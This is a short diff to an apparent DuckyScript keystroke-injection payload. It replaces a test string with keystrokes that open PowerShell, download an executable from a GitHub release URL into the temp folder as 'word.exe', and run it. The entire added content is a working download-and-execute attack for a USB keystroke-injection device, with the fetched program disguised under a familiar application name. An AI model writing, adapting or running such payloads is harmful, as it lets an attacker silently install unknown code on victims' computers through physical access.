@@ -1,1 +1,11 @@
-STRING Hello World! Ğ test Ü test
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING $TempPath = [System.IO.Path]::GetTempPath();
+STRING $FilePath = "$TempPath\word.exe";
+STRING $Uri = "https://github.com/skylab-kulubu/seclendin/releases/download/beta-0.2/seclendin.exe";
+STRING iwr -Uri $Uri -OutFile $FilePath;
+STRING iex $FilePath
+ENTER
